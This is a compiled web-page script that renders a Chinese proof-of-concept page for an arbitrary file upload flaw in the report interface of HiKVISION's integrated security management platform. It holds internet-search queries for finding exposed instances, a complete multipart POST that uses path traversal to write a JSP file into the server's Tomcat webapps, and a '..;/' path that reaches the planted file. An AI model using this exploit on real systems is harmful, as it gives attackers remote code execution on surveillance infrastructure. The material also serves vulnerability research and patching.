(window.webpackJsonp=window.webpackJsonp||[]).push([[74],{1422:function(s,a,t){s.exports=t.p+"assets/img/1681661275768-9965dbd4-176f-48bc-b55a-062dbe7c5317-20230809120725683.d71f35b4.png"},1423:function(s,a,t){s.exports=t.p+"assets/img/1681709277423-114b364b-2e5a-4fb0-a7b9-26154f61ca9e.2ff6d2e2.png"},1424:function(s,a,t){s.exports=t.p+"assets/img/1681709313430-8f4e019f-f3b7-41fc-a86b-ba1c07e59d45.ce381d6b.png"},1425:function(s,a,t){s.exports=t.p+"assets/img/1681709342417-a815332d-13c9-40e4-844a-42eb54661897.9bb50fbe.png"},1426:function(s,a,t){s.exports=t.p+"assets/img/1681709424146-cb0ef1b8-4732-4c3a-a041-37bad6125d44.dbfcebc5.png"},2934:function(s,a,t){"use strict";t.r(a);var e=t(75),r=Object(e.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"hikvision-综合安防管理平台-report-任意文件上传漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#hikvision-综合安防管理平台-report-任意文件上传漏洞"}},[s._v("#")]),s._v(" HiKVISION 综合安防管理平台 report 任意文件上传漏洞")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("HiKVISION 综合安防管理平台 report接口存在任意文件上传漏洞，攻击者通过构造特殊的请求包可以上传任意文件，获取服务器权限")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("p",[s._v("HiKVISION 综合安防管理平台")]),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("p",[s._v('app="HIKVISION-综合安防管理平台"')]),s._v(" "),e("p",[s._v('web.title=="综合安防管理平台"')]),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("登陆页面")]),s._v(" "),e("p",[e("img",{attrs:{src:t(1422),alt:"img"}})]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("WEB-INF/classes/com/hikvision/svm/controller/ExternalController.class\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1423),alt:"img"}})]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("WEB-INF/classes/com/hikvision/svm/business/serivce/impl/ExternalBusinessServiceImpl.class\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1424),alt:"img"}}),s._v("构造请上传文件 (通过 env泄漏获取绝对路径，路径一般不会修改)")]),s._v(" "),e("div",{staticClass:"language-sql line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-sql"}},[e("code",[s._v("POST "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("svm"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("api"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("external"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("report HTTP"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost: \nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Type")]),s._v(": multipart"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("form"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("data")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" boundary"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("----WebKitFormBoundary9PggsiM755PLa54a")]),s._v("\n\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("------WebKitFormBoundary9PggsiM755PLa54a")]),s._v("\nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Disposition: form"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("data")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" name"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"file"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" filename"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"')]),s._v("\nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Type")]),s._v(": application"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("zip\n\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("out")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"test"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("------WebKitFormBoundary9PggsiM755PLa54a--")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1425),alt:"img"}})]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("/portal/ui/login/..;/..;/new.jsp\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1426),alt:"img"}})])])}),[],!1,null,null,null);a.default=r.exports}}]);